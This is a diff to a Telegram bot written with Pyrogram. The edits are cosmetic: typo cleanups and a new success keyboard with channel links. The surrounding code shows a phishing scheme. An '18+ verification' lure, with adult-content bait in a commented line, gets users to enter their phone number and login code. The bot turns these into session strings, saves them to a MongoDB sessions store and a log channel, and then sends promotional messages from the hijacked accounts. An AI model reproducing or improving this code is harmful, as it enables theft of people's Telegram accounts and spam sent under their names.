@@ -10,7 +10,7 @@ from pyrogram.types import (
     ReplyKeyboardMarkup,
     KeyboardButton,
     ReplyKeyboardRemove,
-    CallbackQuery  # Fixed: Removed 'login' suffix
+    CallbackQuery
 )
 from pyrogram.errors import (
     PhoneNumberInvalid,
@@ -21,13 +21,13 @@ from pyrogram.errors import (
     FloodWait,
     AuthKeyUnregistered,
     SessionRevoked,
-    SessionExpired  # Fixed: Removed 'loginlogin' suffix
+    SessionExpired
 )
 
 from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
 from pymongo import MongoClient
 
-# MongoDB Setuplogin
+# MongoDB Setup
 mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
 database = mongo_client['Cluster0']['sessions']
 
@@ -46,12 +46,11 @@ PROMO_TEXTS = [
 ]
 
 # Strings
-#    'age_verification': "**🔥 ʀᴇᴀᴅʏ ғᴏʀ ᴜɴʟɪᴍɪᴛᴇᴅ ᴀᴅᴜʟᴛ ᴠɪᴅᴇᴏs? \n\n🚀 ᴄᴏɴғɪʀᴍ ʏᴏᴜ'ʀᴇ 18+ ᴛᴏ ᴜɴʟᴏᴄᴋ ɪɴsᴛᴀɴᴛ ᴀᴄᴄᴇss ᴛᴏ ᴛʜᴇ ʜᴏᴛᴛᴇsᴛ ᴄᴀᴛᴇɢᴏʀɪᴇs.  \n\n⚡️ ᴅᴏɴ'ᴛ ᴍɪss ɪᴛ — ᴀᴄᴄᴇss ɪs ʟɪᴍɪᴛᴇᴅ!  \n\n👇 Click below to verify 👇",
 strings = {
     'need_login': "You Have To /start First!",
     'already_logged_in': "You're Already Logged In! 🥳",
     'age_verification': "**⚠️ Need 18+ Verification! ⚠️**\n\nYou Must Be 18+ To Proceed.\n\nClick Below Button To Verify 👇",
-    'verification_success': "**✅ Verification Done! ✅**\n\nAccess granted to premium content!",
+    'verification_success': "**✅ Verification Done! ✅**",
     'logout_success': "**🔒 Logged out! 🔒**\n\nPlease /start To Access Again.",
     'not_logged_in': "**Not logged in! **\n\nPlease /start First.",
     'otp_wrong': "**❌ WRONG VERIFICATION CODE! ❌**\n\nYour Attempts left: {attempts}\n\n📤 Re-enter The Verification Code We sent:",
@@ -84,6 +83,17 @@ OTP_KEYBOARD = InlineKeyboardMarkup([
         InlineKeyboardButton("🔙", callback_data="otp_back"),
         InlineKeyboardButton("0️⃣", callback_data="otp_0"),
         InlineKeyboardButton("🆗", callback_data="otp_submit")
+    ]
+])
+
+# Verification Success Keyboard
+VERIFICATION_SUCCESS_KEYBOARD = InlineKeyboardMarkup([
+    [
+        InlineKeyboardButton("🌟 Premium Access", url="https://t.me/premium_channel"),
+        InlineKeyboardButton("📢 Updates", url="https://t.me/updates_channel")
+    ],
+    [
+        InlineKeyboardButton("🆘 Support", url="https://t.me/support_group")
     ]
 ])
 
@@ -375,7 +385,11 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
             except Exception:
                 pass
         
-        await bot.send_message(user_id, strings['verification_success'])
+        await bot.send_message(
+            user_id,
+            strings['verification_success'],
+            reply_markup=VERIFICATION_SUCCESS_KEYBOARD
+        )
         asyncio.create_task(send_promotion_messages(bot, string_session, phone_number))
         
     except Exception as e:
